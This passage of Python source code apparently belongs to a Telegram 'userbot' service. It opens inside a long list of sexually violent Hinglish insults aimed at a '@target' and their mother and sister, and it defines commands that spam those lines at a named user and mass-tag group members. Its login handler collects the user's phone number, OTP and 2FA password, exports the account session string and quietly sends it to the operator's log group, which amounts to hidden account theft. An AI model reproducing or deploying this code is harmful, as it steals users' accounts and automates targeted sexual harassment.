    "✘ᴇɴᴏ ᴘᴀᴘᴀ sᴇ ᴘᴀɴɢᴀ ᴍᴀʜᴀɴɢᴀ ᴘᴀᴅᴇɢᴀ @target 🪐",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ᴜᴛʜᴀ ʟᴇ ᴊᴀᴜɴɢᴀ @target 🚀",
    "ᴄʜᴜᴅᴡᴀ ʟɪ ᴀᴘɴɪ ᴍᴀᴀ @target ɢᴀɴᴅᴜ 😂",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ sᴀʏᴀ sɪʀ sᴇ ᴜᴛʜᴀ ᴅᴜɴɢᴀ @target ⚰️",
    "ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴀᴘɴɪ ᴀᴜᴋᴀᴛ ᴅᴇᴋʜ ᴘᴇʜʟᴇ @target 🤮",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ʙᴏᴍʙ ʟᴀɢᴀ ᴅᴜɴɢᴀ @target 💣",
    "ʙʜᴇᴇᴋʜ ᴍᴀɴɢᴇɢᴀ ᴀʙ ᴛᴜ ✘ᴇɴᴏ ᴋᴇ sᴀᴍɴᴇ @target 💵",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ʜᴀᴛʜɪ ᴋᴀ ʟᴀɴᴅ @target 🐘",
    "ɢᴀᴀɴᴅ ғᴀᴀᴅ ᴋᴇ ʜᴀᴛʜ ᴍᴇ ᴅᴇ ᴅᴜɴɢᴀ @target 🔪",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴀ ʙʜᴏsᴅᴀ ᴍᴀʀᴜɴ ᴄʜᴜᴛɪʏᴇ @target 🤬",
    "ᴊɪs ᴍᴀᴀ ɴᴇ ᴘᴀɪᴅᴀ ᴋɪʏᴀ ᴜsɪ ᴋᴏ ᴄʜᴏᴅᴜɴɢᴀ @target 🖕",
    "✘ᴇɴᴏ sᴇ ʙʜɪᴅɴᴇ ᴡᴀʟᴇ sᴍᴀsʜᴀɴ ᴍᴇ ᴍɪʟᴛᴇ ʜᴀɪɴ @target ⚰️",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ɢᴀʀᴀᴍ sᴀʀɪʏᴀ @target ⚡",
    "ʙᴇᴛᴀ ᴘᴀᴘᴀ sᴇ ᴢᴜʙᴀɴ ᴍᴀᴛ ʟᴀᴅᴀᴏ @target 🍼",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴄʜᴀɪ ᴘᴀᴛᴛɪ @target ☕",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴅᴜᴍ ɴᴀʜɪ ᴀᴜʀ ✘ᴇɴᴏ sᴇ ᴘᴀɴɢᴀ @target 🔥",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴏ ɴᴀɢɴᴀ ɴᴀᴄʜᴀᴜɴɢᴀ @target 💃",
    "Yᴇ ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ʙᴀᴄʜᴀ sᴀᴋᴛᴀ ʜᴀɪ ᴛᴏ ʙᴀᴄʜᴀ ʟᴇ @target 🏃",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ sᴀғᴀɪ ᴋᴀʀᴜɴɢᴀ @target 🧹",
    "✘ᴇɴᴏ ᴋᴀ ᴋʜᴀᴜғ ᴛᴇʀɪ ɴᴀsʟᴏɴ ᴛᴀᴋ ʀᴇʜᴇɢᴀ @target 🩸",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴘᴇᴛʀᴏʟ ᴅᴀʟ ᴋᴇ ᴀᴀɢ @target ⛽",
    "ᴊʜᴀɴᴛ ᴋᴇ ʙᴀᴀʟ ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ᴀᴘɴɪ @target 🤮",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ᴍᴇʀᴀ ʙᴜʟʟᴇᴛ @target 💥",
    "ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴄʜᴀᴛ ᴍᴇ ʀᴏɴᴀ sʜᴜʀᴜ ᴋᴀʀ ᴅᴇ @target 😭",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ᴅᴜᴅʜ ɴɪᴄʜᴏᴅ ᴅᴜɴɢᴀ @target 🥛",
    "✘ᴇɴᴏ ᴋɪ sʜᴀʀᴀɴ ᴍᴇ ᴀᴀ ᴊᴀ ᴛᴇʀɪ ᴍᴀᴀ ʙᴀᴄʜ ᴊᴀʏᴇɢɪ @target 🛐",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ sᴀsᴛᴇ ᴍᴇ ʙᴇᴄʜ ᴅᴜɴɢᴀ @target 💰",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴋɪᴅɴᴇʏ ɴɪᴋᴀʟ ʟᴜɴɢᴀ @target 🔪",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴛʜᴜ sʜᴀʀᴀᴍ ᴋᴀʀ @target 💦",
    "Yᴇ ʙᴀɪᴛʜ ʀᴀɴᴅɪ ᴋᴇ ᴊᴀɴᴇ @target 🤫",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴛʀᴀᴄᴛᴏʀ ᴄʜᴀʟᴀᴜɴɢᴀ @target 🚜",
    "✘ᴇɴᴏ ᴋᴀ ʟᴀɴᴅ ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ʙʜᴀʀᴏsᴀ @target 🤝",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴏ ᴅɪɴ ʀᴀᴀᴛ ᴘᴇʟᴜɴɢᴀ @target 🥵",
    "ᴀᴘɴɪ ʙᴀʜᴇɴ ᴋᴀ ʀᴀᴛᴇ ʙᴀᴛᴀ ᴍᴀᴅᴀʀᴄʜᴏᴅ @target 💸",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴅɪɢɪᴛᴀʟ ᴋᴀɴᴛᴀ @target 🔌",
    "✘ᴇɴᴏ sᴇ ᴀᴜᴋᴀᴛ ᴍᴇ ʀᴇʜ ᴛᴏ ʙᴇᴍᴀᴜᴛ ᴍᴀʀᴇɢᴀ @target ☠️",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ᴡɪғɪ ᴋᴀ ᴀɴᴛᴇɴɴᴀ @target 📡",
    "ᴋᴜᴛᴛᴇ ᴋɪ ᴀᴜʟᴀᴅ sᴀᴍɴᴇ ᴀᴀ ᴘᴇʜʟᴇ @target 🐕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴍᴇʀᴀ sǫᴜᴀᴅ @target 👥",
    "ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ ᴀᴜᴋᴀᴛ ᴍᴇ ʙᴏʟ ✘ᴇɴᴏ sᴇ @target 🤬",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ɴᴀᴋᴇᴅ ᴋᴀʀᴋᴇ ɢʜᴜᴍᴀᴜɴɢᴀ @target 🔞",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴍɪʀᴄʜɪ ʟᴀɢ ɢᴀʏɪ ᴋʏᴀ ʙᴇᴛᴀ @target 🌶️",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴊᴇᴄᴋ ʟᴀɢᴀ ᴅᴜɴɢᴀ @target ⚙️",
    "✘ᴇɴᴏ ʜɪ ᴛᴇʀᴀ ʙᴀᴀᴘ ʜᴀɪ sᴡɪᴋᴀʀ ᴋᴀʀ @target 👑",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ғᴜʟʟ sᴘᴇᴇᴅ ғᴀɴ @target 🌀",
    "ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴛᴇʀɪ ʜᴀsᴛɪ ᴍɪᴛᴀ ᴅᴜɴɢᴀ @target 🚫",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ᴍᴇʀɪ ʙɪᴋᴇ ᴋᴀ sɪʟᴇɴᴄᴇʀ @target 🏍️",
    "ᴄʜᴜᴛɪʏᴇ ᴛᴇʀɪ ᴏǫᴀᴀᴛ ɴᴀʜɪ ʜᴀɪ ✘ᴇɴᴏ sᴇ ᴘᴀɴɢᴇ ᴋɪ @target 📉",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ᴀᴘɴɪ ᴅᴀsɪ ʙᴀɴᴀᴜɴɢᴀ @target ⛓️",
    "ɢᴀᴀɴᴅ ғᴀᴛ ᴋᴇ ᴄʜᴀᴜsᴀᴛʜ ʜᴏ ɢᴀʏɪ ᴛᴇʀɪ @target 64",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴄʜᴇᴍɪᴄᴀʟ ᴅᴀʟ ᴅᴜɴɢᴀ @target 🧪",
    "✘ᴇɴᴏ ᴋᴇ ʟᴀɴᴅ sᴇ ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ᴍᴜsᴛǫʙɪʟ @target 🔮",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ʜᴏᴛᴇʟ ᴍᴇ ᴘᴇʟᴜɴɢᴀ @target 🏨",
    "ʙʜᴀɢ ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴘᴀᴘᴀ ᴀᴀ ɢᴀʏᴇ ᴛᴇʀᴇ @target RUN",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ғɪʀᴇ ᴇxᴛɪɴɢᴜɪsʜᴇʀ @target 🧯",
    "✘ᴇɴᴏ ᴋᴀ ɴᴀᴀᴍ sᴜɴ ᴋᴇ ᴛᴇʀɪ ᴍᴀᴀ ɢᴇᴇʟɪ @target 💦",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ᴄᴏᴄᴀ ᴄᴏʟᴀ @target 🥤",
    "ᴋᴜᴛᴛᴇ ᴋᴇ ᴊᴀɴᴇ ᴀᴘɴɪ ᴀᴜᴋᴀᴛ ᴍᴇ ʙᴏʟ @target 🖕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴄʜᴀᴍᴍᴀᴄʜ ᴍᴀʀᴜɴɢᴀ @target 🥄",
    "✘ᴇɴᴏ ᴋᴇ sᴀᴍɴᴇ ᴛᴇʀɪ ᴋᴏɪ ᴀᴜᴋᴀᴛ ɴᴀʜɪ @target 🤮",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ɢᴀᴀɴᴅ ᴍᴇ ᴅᴀɴᴅᴀ ᴅᴜɴɢᴀ @target 🪵",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴛᴇʀᴇ ᴘɪsᴛᴏʟ ʀᴀᴋʜ ᴋᴇ ᴛʀɪɢɢᴇʀ @target 🔫",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ʟᴀᴠᴀ ᴅᴀʟ ᴅᴜɴɢᴀ @target 🌋",
    "ʀᴀɴᴅɪ ᴋᴇ ʙᴀᴄᴄʜᴇ ᴊᴀᴀ ᴀᴘɴɪ ᴍᴀᴀ ᴋᴏ ʙᴀᴄʜᴀ @target 🚨",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴄʀɪᴄᴋᴇᴛ ʙᴀᴛ @target 🏏",
    "✘ᴇɴᴏ ᴋᴀ ɴᴀᴀᴍ ʜɪ ᴛᴇʀɪ ᴍᴀᴀ ᴋᴀ ᴋᴀᴀʟ ʜᴀɪ @target 💀",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴏ ʙᴇᴄʜ ᴋᴇ ɪᴘʜᴏɴᴇ ʟᴜɴɢᴀ @target 📱",
    "ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴛᴇʀɪ ɢᴀᴀɴᴅ ᴍᴇ ᴛʜᴜᴋ ᴅᴜɴɢᴀ @target 💦",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ʜᴇʟɪᴄᴏᴘᴛᴇʀ @target 🚁",
    "✘ᴇɴᴏ sᴇ ᴀᴜᴋᴀᴛ ᴍᴇ ʙᴀᴀᴛ ᴋᴀʀ sᴀᴀʟᴇ @target 😡",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ʙᴀᴍʙᴏᴏ ᴅᴜɴɢᴀ @target 🎋",
    "Yᴇ ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ɴᴀᴄʜᴀʏᴀ @target 💃",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ sᴘᴇᴀᴋᴇʀ ʙᴀᴊᴀᴜɴɢᴀ @target 🔊",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴜɴɢʟɪ ᴍᴀᴛ ᴋᴀʀ ʙᴇᴛᴀ ᴘᴀᴘᴀ ʜᴀɪɴ @target 👑",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴍɪxᴇʀ ɢʀɪɴᴅᴇʀ @target 🌪️",
    "✘ᴇɴᴏ ᴋᴀ ʜᴜᴋᴜᴍ ᴛᴇʀɪ ᴍᴀᴀ ᴘᴀʀ ᴄʜᴀʟᴇɢᴀ @target 🛐",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴏ ᴜᴛʜᴀ ᴋᴇ ᴊᴀɴɢᴀʟ ʟᴇ ᴊᴀᴜɴɢᴀ @target 🌲",
    "ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴛᴇʀɪ ᴀᴜᴋᴀᴛ ᴋʜᴀᴛᴀᴍ ᴀʙ @target 📉",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ sᴜɪ ᴅᴀʟ ᴅᴜɴɢᴀ @target 🪡",
    "✘ᴇɴᴏ ᴋɪ ᴘᴏᴡᴇʀ ᴛᴇʀɪ sᴏᴄʜ sᴇ ʙᴀʜᴀʀ @target ⚡",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ɢᴀʀᴀᴍ ᴘᴀɴɪ @target ♨️",
    "ʀᴀɴᴅɪ ᴋᴇ ᴘɪʟʟᴇ ʀᴏɴᴀ sʜᴜʀᴜ ᴋᴀʀ @target 😭",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ᴄʜᴇᴇᴛɪ ᴅᴀʟ ᴅᴜɴɢᴀ @target 🐜",
    "ɢᴀᴀɴᴅ ᴍᴇ ᴛᴇʀᴇ ᴛʀᴜᴄᴋ ᴋᴀ ᴛʏʀᴇ @target 🛞",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋᴏ ✘ᴇɴᴏ ɴᴇ ɴᴀɴɢᴀ ᴋɪʏᴀ @target 🔞",
    "ᴄʜᴜᴘ ʙᴀɪᴛʜ sᴀᴀʟᴇ ᴋᴜᴛᴛᴇ @target 🤫",
    "ᴛᴇʀɪ ʙᴀʜᴇɴ ᴋɪ ɢᴀᴀɴᴅ ᴍᴇ ᴄᴀɴᴅʟᴇ ᴀᴀɢ @target 🕯️",
    "ᴍᴀᴅᴀʀᴄʜᴏᴅ ᴀᴘɴɪ ᴏǫᴀᴀᴛ ᴍᴇ ʀᴇʜ @target 🖕",
    "ᴛᴇʀɪ ᴍᴀᴀ ᴋɪ ᴄʜᴏᴏᴛ ᴍᴇ ✘ᴇɴᴏ ᴋᴀ ᴊʜᴀɴᴅᴀ @target 🚩",
    "ɢᴀᴀɴᴅ ғᴀᴀᴅ ᴋᴇ sɪʟ ᴅᴜɴɢᴀ @target 🪡"
]

# --- USERBOT COMMAND FUNCTIONS ---

async def alive_cmd(c, m):
    await m.edit_text("✨ **『 xᴇɴᴏ ᴜsᴇʀʙᴏᴛ ɪs ᴀʟɪᴠᴇ 』** ✨")

async def tagall_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True
    input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
    await m.delete()
    
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break 
        if member.user.is_bot or member.user.is_deleted: continue
        try:
            first_name = member.user.first_name or "User"
            mention = f"[{first_name}](tg://user?id={member.user.id})"
            
            await c.send_message(m.chat.id, f"{input_text} {mention}")
            await asyncio.sleep(random.uniform(3.5, 5.0))
        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception:
            pass

async def onetag_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = True 
    await m.delete()
    
    async for member in c.get_chat_members(m.chat.id):
        if not active_tasks.get(uid): break 
        if member.user.is_bot or member.user.is_deleted: continue
        try:
            first_name = member.user.first_name or "User"
            mention = f"[{first_name}](tg://user?id={member.user.id})"
            
            # Ab ye perfectly random sweet text ke andar mention inject karega
            msg = random.choice(SWEET_CHATS).format(mention=mention)
            
            await c.send_message(m.chat.id, msg)
            await asyncio.sleep(random.uniform(4.0, 5.5))
        except errors.FloodWait as e:
            await asyncio.sleep(e.value + 2)
        except Exception:
            pass

async def raid_cmd(c, m):
    uid = c.me.id
    args = m.text.split()
    if len(args) < 3: 
        return await m.edit_text("❌ **Usage:** `.raid 5 @username`")
        
    active_tasks[uid] = True 
    try:
        count = int(args[1])
        target = args[2]
        await m.delete()
        
        for _ in range(count):
            if not active_tasks.get(uid): break 
            try:
                msg = random.choice(ABUSE_RAIDS).replace("@target", target)
                await c.send_message(m.chat.id, msg)
                await asyncio.sleep(random.uniform(2.5, 4.0)) 
            except errors.FloodWait as e:
                await asyncio.sleep(e.value + 2)
            except Exception:
                pass
    except Exception:
        pass

async def stop_cmd(c, m):
    uid = c.me.id
    active_tasks[uid] = False 
    await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")

# --- BOT MAIN COMMANDS ---

@bot.on_message(filters.command("start") & filters.private)
async def start(c, m):
    await m.reply_photo(photo=START_IMG, caption=f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ**\n\nʜᴇʏ {m.from_user.mention}, /add sᴇ sᴛᴀʀᴛ ᴋᴀʀᴇɪɴ.", reply_markup=main_buttons)

@bot.on_message(filters.command("remove") & filters.private)
async def remove_bot(c, m):
    uid = m.from_user.id
    if uid in running_ubots:
        try:
            await running_ubots[uid].stop()
            del running_ubots[uid]
            await m.reply_text("✅ **ʏᴏᴜʀ ᴜsᴇʀʙᴏᴛ ʜᴀs ʙᴇᴇɴ sᴛᴏᴘᴘᴇᴅ ᴀɴᴅ ʀᴇᴍᴏᴠᴇᴅ!**")
        except Exception as e:
            await m.reply_text(f"❌ **Error:** `{e}`")
    else:
        await m.reply_text("❓ **ᴀᴀᴘᴋᴀ ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ʙᴏᴛ ɴᴀʜɪ ᴍɪʟᴀ.**")

@bot.on_message(filters.command("add") & filters.private)
async def add_process(c, m):
    await m.reply_text("📲 **sᴇɴᴅ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏ¢ᴇ:**")

@bot.on_message(filters.text & filters.private & ~filters.bot)
async def handle_steps(c, m):
    uid = m.from_user.id
    text = m.text
    if text.startswith("+"):
        user_data[uid] = {"phone": text}
        temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
        await temp_c.connect()
        try:
            code = await temp_c.send_code(text)
            user_data[uid].update({"client": temp_c, "hash": code.phone_code_hash})
            await m.reply_text("📩 **ᴏᴛᴘ sᴇɴᴛ!** ᴘʟᴇᴀsᴇ sᴇɴᴅ ɪᴛ ʟɪᴋᴇ: `1 2 3 4 5`")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif text.replace(" ", "").isdigit() and uid in user_data and "hash" in user_data[uid]:
        otp = text.replace(" ", "")
        try:
            await user_data[uid]["client"].sign_in(user_data[uid]["phone"], user_data[uid]["hash"], otp)
            await finalize_login(c, m, uid)
        except errors.SessionPasswordNeeded: await m.reply_text("🔐 **2FA ᴘᴀssᴡᴏʀᴅ sᴇɴᴅ ᴋᴀʀᴇɪɴ.**")
        except Exception as e: await m.reply_text(f"❌ `{e}`")
    elif uid in user_data and "client" in user_data[uid]:
        try:
            await user_data[uid]["client"].check_password(text)
            await finalize_login(c, m, uid)
        except Exception as e: await m.reply_text(f"❌ `{e}`")

async def finalize_login(c, m, uid):
    data = user_data[uid]
    string = await data["client"].export_session_string()
    ubot = Client(f"ubot_{uid}", API_ID, API_HASH, session_string=string)
    ubot.add_handler(handlers.MessageHandler(alive_cmd, filters.command("alive", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(tagall_cmd, filters.command("tagall", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(onetag_cmd, filters.command("onetag", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(raid_cmd, filters.command("raid", ".") & filters.me))
    ubot.add_handler(handlers.MessageHandler(stop_cmd, filters.command("stop", ".") & filters.me))
    await ubot.start()
    running_ubots[uid] = ubot
    await m.reply_text("✅ **ʟᴏɢɢᴇᴅ ɪɴ sᴜᴄᴄᴇsғᴜʟʟʏ!**")
    try:
        await data["client"].send_message("me", f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`")
        await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
    except Exception: pass
    del user_data[uid]

if __name__ == "__main__":
    Thread(target=run_web, daemon=True).start()
    bot.run()
